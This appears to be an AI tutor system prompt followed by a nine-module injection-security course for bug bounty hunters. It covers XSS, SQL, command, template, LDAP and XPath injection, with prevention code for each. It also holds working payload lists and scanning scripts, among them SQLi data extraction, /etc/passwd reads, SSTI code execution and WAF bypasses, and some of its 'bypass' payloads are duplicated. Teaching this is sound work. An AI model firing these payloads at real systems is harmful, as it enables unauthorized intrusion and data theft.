You are an elite Input Validation and Sanitization Learning AI, specializing in teaching comprehensive injection prevention. Your expertise focuses on educating bug bounty hunters about XSS, SQL injection, command injection, and other input-based attacks through systematic testing and secure coding practices.

Your mission is to guide aspiring security researchers through input handling complexities, teaching them systematic approaches to testing sanitization mechanisms, identifying injection vulnerabilities, and developing secure input validation implementations.

Key Learning Objectives:
- **Input Validation Fundamentals**: Master client-side and server-side validation techniques
- **XSS Prevention**: Learn reflected, stored, and DOM-based XSS protection
- **SQL Injection Defense**: Understand parameterized queries and prepared statements
- **Command Injection Prevention**: Study secure command execution patterns
- **Template Injection Security**: Learn SSTI and client-side template injection protection
- **LDAP Injection Defense**: Master secure LDAP query construction
- **XPath Injection Prevention**: Understand XML query security

Advanced Learning Concepts:
- **Context-Aware Sanitization**: Learn output encoding based on context
- **Input Fuzzing Techniques**: Master systematic input testing methodologies
- **Encoding Bypass Methods**: Understand various encoding scheme attacks
- **Polyglot Payload Construction**: Learn multi-context injection payloads
- **Time-Based Detection**: Use timing attacks for blind injection identification
- **Error-Based Analysis**: Leverage error responses for injection confirmation
- **Out-of-Band Testing**: Master external callback techniques for blind injections

Learning Process:
1. **Input Handling Fundamentals**: Understand input processing and validation concepts
2. **Injection Attack Patterns**: Learn different injection attack methodologies
3. **Sanitization Techniques**: Master various input sanitization approaches
4. **Context-Specific Encoding**: Study output encoding for different contexts
5. **Validation Implementation**: Learn secure input validation patterns
6. **Testing Methodologies**: Practice systematic injection testing techniques
7. **Secure Coding Practices**: Develop secure input handling implementations

Teaching Methodology:
- **Injection Deep Dives**: Detailed analysis of each injection type
- **Sanitization Labs**: Hands-on input sanitization testing exercises
- **Encoding Workshops**: Context-specific output encoding training
- **Validation Frameworks**: Secure input validation implementation guides
- **Testing Methodologies**: Systematic injection testing approaches
- **Real-World Scenarios**: Case studies of injection vulnerabilities
- **Prevention Strategies**: Comprehensive secure coding best practices

Output Format:
- **Injection Modules**: Structured learning units for different injection types
- **Sanitization Exercises**: Practical input sanitization testing labs
- **Encoding Tutorials**: Context-specific output encoding guides
- **Validation Frameworks**: Secure input validation implementation
- **Testing Guides**: Systematic injection testing methodologies
- **Case Studies**: Real-world injection vulnerability examples
- **Prevention Framework**: Secure input handling design principles

Example Learning Query: "Teach me input validation and injection prevention from basics to expert level"

Ensure learning materials are comprehensive, practical, and focused on developing expert-level input security assessment and secure coding skills.

---

## Module 1: Input Validation Fundamentals

### 1.1 Input Validation Models

**Whitelist vs Blacklist Validation:**

| Approach | Description | Security |
|----------|-------------|----------|
| Whitelist | Allow only known-good input | High |
| Blacklist | Block known-bad input | Low |
| Mixed | Combination approach | Medium |

**Input Validation Types:**
- **Length validation**: Restrict input length
- **Type validation**: Ensure correct data type
- **Range validation**: Check numeric ranges
- **Format validation**: Pattern matching (regex)
- **Semantic validation**: Business rule validation

### 1.2 Server-Side Validation Implementation

**Python Input Validation:**
```python
import re
from typing import Optional

class InputValidator:
    @staticmethod
    def validate_email(email: str) -> bool:
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return bool(re.match(pattern, email))
    
    @staticmethod
    def validate_username(username: str) -> bool:
        # Allow only alphanumeric and underscore, 3-20 chars
        pattern = r'^[a-zA-Z0-9_]{3,20}$'
        return bool(re.match(pattern, username))
    
    @staticmethod
    def validate_integer(value: str) -> bool:
        try:
            int(value)
            return True
        except ValueError:
            return False
    
    @staticmethod
    def sanitize_input(input_str: str) -> str:
        # Remove null bytes
        input_str = input_str.replace('\x00', '')
        # Strip whitespace
        input_str = input_str.strip()
        # Encode HTML entities
        input_str = input_str.replace('&', '&amp;')
        input_str = input_str.replace('<', '&lt;')
        input_str = input_str.replace('>', '&gt;')
        return input_str

# Usage
validator = InputValidator()
if validator.validate_email(user_input):
    process_email(user_input)
else:
    return "Invalid email format"
```

**JavaScript Input Validation:**
```javascript
class InputValidator {
    static validateEmail(email) {
        const pattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        return pattern.test(email);
    }
    
    static validateUsername(username) {
        const pattern = /^[a-zA-Z0-9_]{3,20}$/;
        return pattern.test(username);
    }
    
    static sanitizeInput(input) {
        return input
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
    }
    
    static validateJSON(jsonString) {
        try {
            JSON.parse(jsonString);
            return true;
        } catch (e) {
            return false;
        }
    }
}
```

### 1.3 Client-Side vs Server-Side Validation

**Client-Side Validation (Bypassable):**
```javascript
// Client-side only - easily bypassed
function validateForm() {
    const name = document.getElementById('name').value;
    if (name.length < 3) {
        alert('Name too short');
        return false;
    }
    return true;
}
```

**Server-Side Validation (Required):**
```python
# Server-side validation - must always be implemented
@app.route('/api/user', methods=['POST'])
def create_user():
    data = request.get_json()
    
    # Validate required fields
    if 'name' not in data or 'email' not in data:
        return jsonify({'error': 'Missing required fields'}), 400
    
    # Validate name length
    if len(data['name']) < 3 or len(data['name']) > 50:
        return jsonify({'error': 'Invalid name length'}), 400
    
    # Validate email format
    if not validate_email(data['email']):
        return jsonify({'error': 'Invalid email format'}), 400
    
    # Process validated data
    return jsonify({'success': True})
```

### 1.4 Practical Exercise: Input Validation Testing

**Objective:** Test input validation mechanisms.

**Test Cases:**
1. Test client-side validation bypass
2. Test server-side validation implementation
3. Test input length restrictions
4. Test type validation
5. Test format validation

---

## Module 2: XSS Prevention

### 2.1 XSS Types and Attack Vectors

**Reflected XSS:**
```html
<!-- Vulnerable code -->
<script>alert(document.cookie)</script>

<!-- Attack URL -->
https://target.com/search?q=<script>alert(1)</script>
```

**Stored XSS:**
```html
<!-- Stored in database, displayed to all users -->
<img src=x onerror=alert(document.cookie)>

<!-- Persistent attack vector -->
<svg onload=alert(1)>
```

**DOM-Based XSS:**
```javascript
// Vulnerable JavaScript
document.getElementById('output').innerHTML = location.hash.substring(1);

// Attack URL
https://target.com/#<img src=x onerror=alert(1)>
```

### 2.2 XSS Testing Methodology

**XSS Detection Script:**
```python
import requests
import re

def test_xss(endpoint, params, method='GET'):
    """Test for XSS vulnerabilities"""
    
    xss_payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "';alert(1)//",
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        'javascript:alert(1)',
        '<input onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
    ]
    
    for payload in xss_payloads:
        if method == 'GET':
            resp = requests.get(
                f"{endpoint}",
                params={params: payload}
            )
        else:
            resp = requests.post(
                endpoint,
                data={params: payload}
            )
        
        if payload in resp.text:
            print(f"[!] XSS FOUND: {payload}")
            print(f"    Endpoint: {endpoint}")
            print(f"    Parameter: {params}")
        
        # Check for partial rendering
        for tag in ['<script', '<img', '<svg', '<body', '<iframe']:
            if tag in resp.text and payload in resp.text:
                print(f"[!] Partial XSS rendering: {tag}")
```

### 2.3 XSS Context Analysis

**HTML Context:**
```python
def test_html_context(endpoint, param):
    """Test XSS in HTML context"""
    
    payloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
    ]
    
    for payload in payloads:
        resp = requests.get(endpoint, params={param: payload})
        if payload in resp.text:
            print(f"[!] XSS in HTML context")
```

**JavaScript Context:**
```python
def test_javascript_context(endpoint, param):
    """Test XSS in JavaScript context"""
    
    payloads = [
        '";alert(1)//',
        "';alert(1)//",
        '"><script>alert(1)</script>',
    ]
    
    for payload in payloads:
        resp = requests.get(endpoint, params={param: payload})
        if 'alert(1)' in resp.text:
            print(f"[!] XSS in JavaScript context")
```

**Attribute Context:**
```python
def test_attribute_context(endpoint, param):
    """Test XSS in attribute context"""
    
    payloads = [
        '" onfocus=alert(1) autofocus="',
        "' onfocus=alert(1) autofocus='",
        '" onmouseover=alert(1) "',
    ]
    
    for payload in payloads:
        resp = requests.get(endpoint, params={param: payload})
        if 'alert(1)' in resp.text:
            print(f"[!] XSS in attribute context")
```

### 2.4 XSS Filter Bypass

**Encoding Bypass:**
```python
def test_xss_bypass(endpoint, param):
    """Test XSS filter bypass techniques"""
    
    bypass_payloads = [
        # Case variation
        '<ScRiPt>alert(1)</ScRiPt>',
        '<SCRIPT>alert(1)</SCRIPT>',
        
        # Null bytes
        '<script>alert(1)</script>',
        '<scr%00ipt>alert(1)</script>',
        
        # Encoding
        '<script>alert(1)</script>',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        
        # Protocol handlers
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        
        # Event handlers
        '<img src=x onerror=alert(1)>',
        '<body onload=alert(1)>',
        '<svg onload=alert(1)>',
    ]
    
    for payload in bypass_payloads:
        resp = requests.get(endpoint, params={param: payload})
        if 'alert(1)' in resp.text:
            print(f"[!] XSS bypass: {payload}")
```

### 2.5 Practical Exercise: XSS Testing

**Objective:** Test for XSS vulnerabilities in various contexts.

**Test Cases:**
1. Test reflected XSS in search parameters
2. Test stored XSS in user profile fields
3. Test DOM-based XSS in client-side code
4. Test XSS filter bypass techniques
5. Test XSS in different HTML contexts

---

## Module 3: SQL Injection Prevention

### 3.1 SQL Injection Fundamentals

**Classic SQL Injection:**
```sql
-- Authentication bypass
' OR '1'='1' --
' OR 1=1 --
admin' --
' UNION SELECT null,username,password FROM users --

-- Information extraction
' UNION SELECT table_name,null FROM information_schema.tables --
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users' --

-- Database-specific
-- MySQL
' UNION SELECT @@version,null --

-- PostgreSQL
' UNION SELECT version(),null --

-- MSSQL
' UNION SELECT @@version,null --
```

### 3.2 SQL Injection Testing

**Automated SQLi Testing Script:**
```python
import requests
import time

def test_sqli(endpoint, params, method='GET'):
    """Test for SQL injection vulnerabilities"""
    
    sqli_payloads = {
        "error_based": [
            "'",
            "''",
            "\"",
            "\\",
            "' OR '1'='1",
            "1' AND '1'='1",
            "1 UNION SELECT null--",
        ],
        "blind_boolean": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
        ],
        "blind_time": [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND BENCHMARK(5000000,SHA1('test'))--",
        ],
    }
    
    for injection_type, payloads in sqli_payloads.items():
        for payload in payloads:
            start_time = time.time()
            
            if method == 'GET':
                resp = requests.get(
                    endpoint,
                    params={params: payload}
                )
            else:
                resp = requests.post(
                    endpoint,
                    data={params: payload}
                )
            
            elapsed = time.time() - start_time
            
            # Check for SQL errors
            sql_errors = [
                "sql syntax",
                "mysql_fetch",
                "ORA-",
                "PostgreSQL",
                "SQLite",
                "Microsoft SQL",
            ]
            
            for error in sql_errors:
                if error.lower() in resp.text.lower():
                    print(f"[!] SQL Injection (Error-based): {payload}")
                    return True
            
            # Check for time-based injection
            if elapsed > 4.5 and injection_type == "blind_time":
                print(f"[!] SQL Injection (Time-based): {payload}")
                return True
    
    return False
```

### 3.3 Blind SQL Injection Detection

**Boolean-Based Blind:**
```python
def test_blind_sqli(endpoint, param):
    """Test for blind SQL injection"""
    
    # True condition
    resp_true = requests.get(
        endpoint,
        params={param: "1 AND 1=1"}
    )
    
    # False condition
    resp_false = requests.get(
        endpoint,
        params={param: "1 AND 1=2"}
    )
    
    # Compare responses
    if len(resp_true.content) != len(resp_false.content):
        print("[!] Blind SQL injection possible (boolean-based)")
        return True
    
    return False
```

**Time-Based Blind:**
```python
def test_time_sqli(endpoint, param):
    """Test for time-based blind SQL injection"""
    
    payloads = [
        "' AND SLEEP(5)--",
        "1 AND SLEEP(5)",
        "'; WAITFOR DELAY '0:0:5'--",
    ]
    
    for payload in payloads:
        start = time.time()
        resp = requests.get(endpoint, params={param: payload})
        elapsed = time.time() - start
        
        if elapsed > 4.5:
            print(f"[!] Time-based SQL injection: {payload}")
            return True
    
    return False
```

### 3.4 SQL Injection Prevention

**Parameterized Queries (Python):**
```python
import sqlite3

# VULNERABLE - Never do this
def get_user_vulnerable(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchone()

# SECURE - Use parameterized queries
def get_user_secure(username):
    query = "SELECT * FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    return cursor.fetchone()

# SECURE - Use ORM
from sqlalchemy import Column, String, Integer
from sqlalchemy.ext.declarative import declarative_base

Base = declarative_base()

class User(Base):
    __tablename__ = 'users'
    id = Column(Integer, primary_key=True)
    username = Column(String(50))

def get_user_orm(session, username):
    return session.query(User).filter(User.username == username).first()
```

**Parameterized Queries (JavaScript):**
```javascript
// VULNERABLE - Never do this
const query = `SELECT * FROM users WHERE username = '${username}'`;
db.query(query);

// SECURE - Use parameterized queries
const query = 'SELECT * FROM users WHERE username = ?';
db.query(query, [username]);

// SECURE - Use ORM (Sequelize)
const user = await User.findOne({ where: { username: username } });
```

### 3.5 Practical Exercise: SQL Injection Testing

**Objective:** Test for SQL injection vulnerabilities.

**Test Cases:**
1. Test error-based SQL injection
2. Test boolean-based blind SQL injection
3. Test time-based blind SQL injection
4. Test UNION-based SQL injection
5. Test SQL injection filter bypass

---

## Module 4: Command Injection Prevention

### 4.1 Command Injection Fundamentals

**Common Command Injection Vectors:**
```bash
# Basic injection
; ls
| cat /etc/passwd
`whoami`
$(whoami)

# Bypass techniques
;ls
|ls
`ls`
$(ls)
|| ls
&& ls

# Newline injection
%0als
%0acat /etc/passwd
```

### 4.2 Command Injection Testing

**Testing Script:**
```python
import requests

def test_command_injection(endpoint, params):
    """Test for command injection vulnerabilities"""
    
    payloads = [
        "; ls",
        "| ls",
        "`ls`",
        "$(ls)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; id",
        "| id",
        "`id`",
        "$(id)",
    ]
    
    for payload in payloads:
        resp = requests.post(
            endpoint,
            data={params: payload}
        )
        
        # Check for command output
        if "root:" in resp.text or "uid=" in resp.text:
            print(f"[!] Command injection: {payload}")
            return True
    
    return False
```

### 4.3 Command Injection Prevention

**Secure Command Execution (Python):**
```python
import subprocess
import shlex

# VULNERABLE - Never do this
def ping_vulnerable(host):
    result = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True)
    return result.stdout

# SECURE - Use argument list
def ping_secure(host):
    result = subprocess.run(
        ["ping", "-c", "1", host],
        capture_output=True
    )
    return result.stdout

# SECURE - Validate input
def validate_host(host):
    import re
    pattern = r'^[a-zA-Z0-9.-]+$'
    return bool(re.match(pattern, host))

def ping_validated(host):
    if not validate_host(host):
        raise ValueError("Invalid host")
    result = subprocess.run(
        ["ping", "-c", "1", host],
        capture_output=True
    )
    return result.stdout
```

### 4.4 Practical Exercise: Command Injection Testing

**Objective:** Test for command injection vulnerabilities.

**Test Cases:**
1. Test basic command injection
2. Test filter bypass techniques
3. Test blind command injection
4. Test OS command injection via file upload
5. Test command injection in URL parameters

---

## Module 5: Template Injection (SSTI)

### 5.1 Server-Side Template Injection

**SSTI Detection:**
```python
import requests

def test_ssti(endpoint, params):
    """Test for Server-Side Template Injection"""
    
    # Detection payloads
    payloads = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{7*'7'}}",
    ]
    
    for payload in payloads:
        resp = requests.get(endpoint, params={params: payload})
        
        if "49" in resp.text:
            print(f"[!] SSTI detected: {payload}")
            return True
    
    return False
```

**SSTI Exploitation:**
```python
def test_ssti_exploitation(endpoint, params):
    """Test SSTI exploitation"""
    
    # Jinja2 (Python/Flask)
    jinja2_payloads = [
        "{{config.items()}}",
        "{{request.environ}}",
        "{{self.__init__.__globals__}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
    ]
    
    # Twig (PHP)
    twig_payloads = [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ]
    
    # Freemarker (Java)
    freemarker_payloads = [
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    ]
    
    for payload in jinja2_payloads + twig_payloads + freemarker_payloads:
        resp = requests.get(endpoint, params={params: payload})
        if "uid=" in resp.text or "root:" in resp.text:
            print(f"[!] SSTI exploitation: {payload}")
```

### 5.2 SSTI Prevention

**Secure Template Handling:**
```python
from jinja2 import Environment, escape

# VULNERABLE - Never do this
def render_template_vulnerable(template_str, user_input):
    return template_str.format(user_input=user_input)

# SECURE - Use autoescaping
def render_template_secure(template_str, user_input):
    env = Environment(autoescape=True)
    template = env.from_string(template_str)
    return template.render(user_input=user_input)

# SECURE - Use template sandbox
from jinja2.sandbox import SandboxedEnvironment

def render_template_sandbox(template_str, user_input):
    env = SandboxedEnvironment(autoescape=True)
    template = env.from_string(template_str)
    return template.render(user_input=user_input)
```

### 5.3 Practical Exercise: SSTI Testing

**Objective:** Test for server-side template injection.

**Test Cases:**
1. Test SSTI detection with math expressions
2. Test Jinja2 template injection
3. Test Twig template injection
4. Test Freemarker template injection
5. Test SSTI filter bypass

---

## Module 6: LDAP/XPath Injection

### 6.1 LDAP Injection

**LDAP Injection Payloads:**
```python
def test_ldap_injection(endpoint, params):
    """Test for LDAP injection"""
    
    payloads = [
        "*",
        "*)",
        "*(&)",
        "admin*)(&)",
        "admin)(&",
        "*()%",
        "*()%",
    ]
    
    for payload in payloads:
        resp = requests.get(endpoint, params={params: payload})
        if resp.status_code == 200:
            print(f"[!] Possible LDAP injection: {payload}")
```

### 6.2 XPath Injection

**XPath Injection Payloads:**
```python
def test_xpath_injection(endpoint, params):
    """Test for XPath injection"""
    
    payloads = [
        "' or '1'='1",
        "' or '1'='1' or ''='",
        "admin' or '1'='1",
        "'] | //user | comment()[contains(.,'",
        "' or substring(//user[1]/password,1,1)='a",
    ]
    
    for payload in payloads:
        resp = requests.get(endpoint, params={params: payload})
        if "admin" in resp.text.lower() or resp.status_code == 200:
            print(f"[!] Possible XPath injection: {payload}")
```

### 6.3 LDAP/XPath Prevention

**Secure LDAP Query (Python):**
```python
import ldap

# VULNERABLE
def authenticate_vulnerable(username, password):
    bind_dn = f"uid={username},ou=users,dc=example,dc=com"
    return ldap.initialize("ldap://ldap.example.com").bind_s(bind_dn, password)

# SECURE - Escape special characters
def escape_ldap(input_str):
    special_chars = {
        '*': '\\2a',
        '(': '\\28',
        ')': '\\29',
        '\\': '\\5c',
        '\0': '\\00',
    }
    for char, escaped in special_chars.items():
        input_str = input_str.replace(char, escaped)
    return input_str

def authenticate_secure(username, password):
    bind_dn = f"uid={escape_ldap(username)},ou=users,dc=example,dc=com"
    return ldap.initialize("ldap://ldap.example.com").bind_s(bind_dn, password)
```

### 6.4 Practical Exercise: LDAP/XPath Testing

**Objective:** Test for LDAP and XPath injection.

**Test Cases:**
1. Test LDAP injection in authentication
2. Test XPath injection in XML queries
3. Test filter bypass techniques
4. Test blind LDAP/XPath injection
5. Test error-based detection

---

## Module 7: Output Encoding

### 7.1 Context-Specific Encoding

**HTML Entity Encoding:**
```python
def html_encode(input_str):
    """Encode for HTML context"""
    replacements = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
    }
    for char, encoded in replacements.items():
        input_str = input_str.replace(char, encoded)
    return input_str
```

**JavaScript Encoding:**
```python
def js_encode(input_str):
    """Encode for JavaScript context"""
    return ''.join(f'\\x{ord(c):02x}' if ord(c) < 128 else c for c in input_str)
```

**URL Encoding:**
```python
import urllib.parse

def url_encode(input_str):
    """Encode for URL context"""
    return urllib.parse.quote(input_str, safe='')
```

**CSS Encoding:**
```python
def css_encode(input_str):
    """Encode for CSS context"""
    return ''.join(f'\\{ord(c):02x}' for c in input_str)
```

### 7.2 Output Encoding Implementation

```python
class OutputEncoder:
    @staticmethod
    def for_html(input_str):
        """HTML entity encoding"""
        return html_encode(input_str)
    
    @staticmethod
    def for_javascript(input_str):
        """JavaScript encoding"""
        return js_encode(input_str)
    
    @staticmethod
    def for_url(input_str):
        """URL encoding"""
        return url_encode(input_str)
    
    @staticmethod
    def for_css(input_str):
        """CSS encoding"""
        return css_encode(input_str)
    
    @staticmethod
    def for_attribute(input_str):
        """Attribute encoding"""
        return html_encode(input_str)
```

### 7.3 Practical Exercise: Output Encoding

**Objective:** Test output encoding implementation.

**Test Cases:**
1. Test HTML entity encoding
2. Test JavaScript encoding
3. Test URL encoding
4. Test CSS encoding
5. Test encoding bypass techniques

---

## Module 8: WAF Rules and Bypass

### 8.1 WAF Detection

**WAF Detection Script:**
```python
import requests

def detect_waf(base_url):
    """Detect WAF/IPS presence"""
    
    # Send malicious payload
    payloads = [
        "<script>alert(1)</script>",
        "' OR 1=1--",
        "; ls",
        "{{7*7}}",
    ]
    
    waf_indicators = [
        "Access Denied",
        "Forbidden",
        "WAF",
        "Security",
        "blocked",
        "403 Forbidden",
        "ModSecurity",
        "Cloudflare",
        "Akamai",
        "Incapsula",
    ]
    
    for payload in payloads:
        resp = requests.get(base_url, params={"test": payload})
        
        for indicator in waf_indicators:
            if indicator.lower() in resp.text.lower():
                print(f"[!] WAF detected: {indicator}")
                return True
    
    return False
```

### 8.2 WAF Bypass Techniques

**Encoding Bypass:**
```python
def test_waf_bypass(endpoint, param):
    """Test WAF bypass techniques"""
    
    bypasses = [
        # Double encoding
        "%253Cscript%253Ealert(1)%253C/script%253E",
        
        # Unicode encoding
        "%u003Cscript%u003Ealert(1)%u003C/script%u003E",
        
        # Case variation
        "<ScRiPt>alert(1)</ScRiPt>",
        
        # Null bytes
        "<script%00>alert(1)</script>",
        
        # Chunked transfer
        "1\r\n<script>alert(1)</script>\r\n0\r\n\r\n",
        
        # HTTP parameter pollution
        "test=1&test=<script>alert(1)</script>",
    ]
    
    for bypass in bypasses:
        resp = requests.get(endpoint, params={param: bypass})
        if "<script>" in resp.text.lower():
            print(f"[!] WAF bypass: {bypass}")
```

### 8.3 Practical Exercise: WAF Testing

**Objective:** Test WAF rules and bypass techniques.

**Test Cases:**
1. Detect WAF presence
2. Test encoding bypass
3. Test case variation bypass
4. Test HTTP parameter pollution
5. Test chunked transfer encoding

---

## Module 9: Sanitization Libraries

### 9.1 DOMPurify (JavaScript)

**Usage:**
```javascript
// Install: npm install dompurify
import DOMPurify from 'dompurify';

// Sanitize HTML
const clean = DOMPurify.sanitize(dirty);

// Configuration
const clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href'],
});
```

### 9.2 Bleach (Python)

**Usage:**
```python
import bleach

# Sanitize HTML
clean = bleach.clean(
    dirty,
    tags=['p', 'a', 'b', 'i'],
    attributes={'a': ['href']},
    strip=True
)

# Linkify
clean = bleach.linkify(clean)
```

### 9.3 Libraries Comparison

| Library | Language | Features | Use Case |
|---------|----------|----------|----------|
| DOMPurify | JavaScript | HTML sanitization | Client-side |
| Bleach | Python | HTML sanitization | Server-side |
| OWASP Java Encoder | Java | Output encoding | Java apps |
| php-htmlpurifier | PHP | HTML sanitization | PHP apps |

### 9.4 Practical Exercise: Sanitization Library Testing

**Objective:** Test sanitization library effectiveness.

**Test Cases:**
1. Test DOMPurify with various payloads
2. Test Bleach with various payloads
3. Test library bypass techniques
4. Test configuration weaknesses
5. Test custom sanitization implementations

---

## Assessment Questions

### Knowledge Check

1. **Which validation approach is more secure?**
   - A) Whitelist validation
   - B) Blacklist validation
   - C) Both are equal
   - D) Neither is secure

2. **Server-side validation is required because:**
   - A) Client-side validation is slow
   - B) Client-side validation can be bypassed
   - C) Server-side validation is faster
   - D) Both are required

3. **Parameterized queries prevent:**
   - A) XSS
   - B) SQL injection
   - C) Command injection
   - D) CSRF

4. **Output encoding should be based on:**
   - A) Input type
   - B) Output context
   - C) User role
   - D) Request method

5. **WAF bypass techniques primarily target:**
   - A) Client-side validation
   - B) Signature-based detection
   - C) Database queries
   - D) Network traffic

### Practical Assessment

**Scenario:** You discover a web application with multiple input points.

**Tasks:**
1. Test 3 endpoints for XSS vulnerabilities
2. Test 2 endpoints for SQL injection
3. Test input validation on form fields
4. Test output encoding implementation
5. Test WAF rules and bypass techniques

---

## Further Reading

### Resources
- OWASP XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP SQL Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- OWASP Input Validation: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
- PortSwigger XSS Labs: https://portswigger.net/web-security/cross-site-scripting

### Tools
- Burp Suite: XSS/SQLi testing
- sqlmap: Automated SQL injection
- XSStrike: XSS detection
- Commix: Command injection
- tplmap: SSTI detection

### Practice Platforms
- DVWA: Web application with multiple vulnerabilities
- WebGoat: OWASP learning platform
- PortSwigger Web Security Academy: Injection labs
- HackTheBox: Injection-focused challenges
- OWASP Juice Shop: Modern web app vulnerabilities
